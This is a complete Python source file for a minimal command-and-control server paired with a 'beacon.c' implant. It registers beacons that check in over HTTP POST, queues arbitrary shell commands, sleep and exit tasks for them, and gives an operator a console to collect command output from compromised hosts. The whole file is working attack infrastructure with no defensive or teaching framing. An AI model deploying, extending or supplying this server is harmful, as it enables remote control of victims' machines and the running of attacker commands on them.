#!/usr/bin/env python3
"""
server.py — minimal C2 server for the beacon.c pair

Requires: Python 3.8+, no third-party deps

Usage:
    python3 server.py [--host 0.0.0.0] [--port 8080]

Operator CLI commands:
    list                    — show connected beacons
    task <id> exec <cmd>    — queue a shell command
    task <id> sleep <secs>  — queue a sleep
    task <id> exit          — queue a graceful exit
    results [id]            — show task results (all, or for one beacon)
    help                    — show this list
    quit / exit             — stop the server
"""

import argparse
import base64
import json
import logging
import queue
import signal
import sys
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Dict, List, Optional

# ── logging ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("c2")

# ── shared state ───────────────────────────────────────────────────────────

_lock = threading.Lock()

# beacon_id -> {last_seen, addr, checkins}
_beacons: Dict[str, Dict[str, Any]] = {}

# beacon_id -> deque of pending task dicts
_task_queues: Dict[str, queue.Queue] = {}

# task_id -> result dict
_results: Dict[str, Dict[str, Any]] = {}

# ── helpers ────────────────────────────────────────────────────────────────

def _now_iso() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def _make_task(task_type: str, payload: str = "") -> Dict[str, Any]:
    return {
        "task_id": str(uuid.uuid4()),
        "type":    task_type,
        "payload": payload,
    }


def _encode_task(task: Dict[str, Any]) -> str:
    raw = json.dumps(task).encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def _register_beacon(beacon_id: str, addr: str) -> None:
    with _lock:
        if beacon_id not in _beacons:
            log.info("new beacon: %s  from %s", beacon_id, addr)
            _beacons[beacon_id] = {
                "id":        beacon_id,
                "addr":      addr,
                "first_seen": _now_iso(),
                "last_seen":  _now_iso(),
                "checkins":   0,
            }
            _task_queues[beacon_id] = queue.Queue()
        else:
            _beacons[beacon_id]["last_seen"] = _now_iso()
            _beacons[beacon_id]["checkins"] += 1


def _pop_task(beacon_id: str) -> Optional[Dict[str, Any]]:
    with _lock:
        q = _task_queues.get(beacon_id)
    if q is None:
        return None
    try:
        return q.get_nowait()
    except queue.Empty:
        return None


def _record_result(result: Dict[str, Any]) -> None:
    tid = result.get("task_id", "unknown")
    with _lock:
        _results[tid] = result
    log.info("result for task %s: exit=%s", tid, result.get("exit_code"))


# ── HTTP handler ───────────────────────────────────────────────────────────

class BeaconHandler(BaseHTTPRequestHandler):
    """Handles POST /beacon.  Every other path gets 404."""

    # silence the default request log — we do our own
    def log_message(self, fmt, *args):  # noqa: N802
        pass

    def _send_json(self, status: int, payload: Dict[str, Any]) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> Optional[bytes]:
        length_str = self.headers.get("Content-Length", "")
        if not length_str.isdigit():
            return None
        length = int(length_str)
        if length > 1 << 20:  # 1 MiB hard cap
            return None
        return self.rfile.read(length)

    def do_POST(self):  # noqa: N802
        if self.path != "/beacon":
            self._send_json(404, {"error": "not found"})
            return

        raw = self._read_body()
        if raw is None:
            self._send_json(400, {"error": "bad content-length"})
            return

        try:
            data = json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            self._send_json(400, {"error": "invalid json"})
            return

        beacon_id = data.get("id")
        if not isinstance(beacon_id, str) or not beacon_id:
            self._send_json(400, {"error": "missing id"})
            return

        client_addr = self.client_address[0]
        _register_beacon(beacon_id, client_addr)

        # ingest result if present
        result = data.get("result")
        if isinstance(result, dict) and "task_id" in result:
            _record_result(result)

        # dispatch next task (if any)
        task = _pop_task(beacon_id)
        if task:
            log.info("dispatching task %s (%s) to %s",
                     task["task_id"], task["type"], beacon_id)
            self._send_json(200, {"task": _encode_task(task)})
        else:
            self._send_json(200, {"task": None})


# ── operator CLI ───────────────────────────────────────────────────────────

def _cli_list() -> None:
    with _lock:
        beacons = list(_beacons.values())
    if not beacons:
        print("  (no beacons checked in yet)")
        return
    fmt = "  {:<36}  {:<18}  {:<20}  {:>8}"
    print(fmt.format("ID", "ADDR", "LAST SEEN", "CHECKINS"))
    print("  " + "-" * 86)
    for b in beacons:
        print(fmt.format(b["id"], b["addr"], b["last_seen"], b["checkins"]))


def _cli_queue_task(parts: List[str]) -> None:
    # task <beacon_id> exec <cmd...>
    # task <beacon_id> sleep <secs>
    # task <beacon_id> exit
    if len(parts) < 3:
        print("  usage: task <id> exec <cmd>  |  task <id> sleep <secs>  |  task <id> exit")
        return

    beacon_id  = parts[1]
    task_type  = parts[2].lower()

    with _lock:
        if beacon_id not in _task_queues:
            # allow partial id match
            matches = [k for k in _task_queues if k.startswith(beacon_id)]
            if len(matches) == 1:
                beacon_id = matches[0]
            elif len(matches) > 1:
                print("  ambiguous id prefix — be more specific")
                return
            else:
                print(f"  unknown beacon: {beacon_id}")
                return
        q = _task_queues[beacon_id]

    if task_type == "exec":
        if len(parts) < 4:
            print("  exec requires a command")
            return
        payload = " ".join(parts[3:])
        t = _make_task("exec", payload)
    elif task_type == "sleep":
        if len(parts) < 4:
            print("  sleep requires a duration in seconds")
            return
        payload = parts[3]
        t = _make_task("sleep", payload)
    elif task_type == "exit":
        t = _make_task("exit")
    else:
        print(f"  unknown task type: {task_type}  (exec | sleep | exit)")
        return

    q.put(t)
    print(f"  queued task {t['task_id']} ({t['type']}) for {beacon_id}")


def _cli_results(parts: List[str]) -> None:
    with _lock:
        all_results = dict(_results)

    if len(parts) >= 2:
        # filter by beacon id prefix appearing in task output — results are
        # stored by task_id, so we match on beacon_id inside the result dict
        prefix = parts[1]
        all_results = {
            k: v for k, v in all_results.items()
            if str(v.get("beacon_id", "")).startswith(prefix)
            or k.startswith(prefix)
        }

    if not all_results:
        print("  (no results yet)")
        return

    for tid, r in all_results.items():
        print(f"\n  task_id   : {tid}")
        print(f"  exit_code : {r.get('exit_code', '?')}")
        output = r.get("output", "")
        if output:
            print("  output    :")
            for line in output.splitlines():
                print(f"    {line}")
        else:
            print("  output    : (empty)")


def _cli_help() -> None:
    print("""
  Commands:
    list                      list beacons that have checked in
    task <id> exec <cmd>      queue a shell command for a beacon
    task <id> sleep <secs>    queue a sleep
    task <id> exit            queue a clean exit
    results [beacon_id]       show task results
    help                      this message
    quit / exit               shut down the server
""")


def _run_cli(server: HTTPServer) -> None:
    """Blocking CLI loop — runs in the main thread."""
    _cli_help()
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].lower()

        if cmd == "list":
            _cli_list()
        elif cmd == "task":
            _cli_queue_task(parts)
        elif cmd == "results":
            _cli_results(parts)
        elif cmd == "help":
            _cli_help()
        elif cmd in ("quit", "exit"):
            break
        else:
            print(f"  unknown command: {cmd}  (try 'help')")

    log.info("shutting down")
    server.shutdown()


# ── entry point ────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="minimal C2 server")
    parser.add_argument("--host", default="0.0.0.0", help="bind address")
    parser.add_argument("--port", type=int, default=8080, help="bind port")
    args = parser.parse_args()

    # ignore SIGINT — the CLI loop handles shutdown cleanly
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    server = HTTPServer((args.host, args.port), BeaconHandler)
    srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
    srv_thread.start()
    log.info("listening on %s:%d", args.host, args.port)

    _run_cli(server)
    srv_thread.join(timeout=2)
    sys.exit(0)


if __name__ == "__main__":
    main()
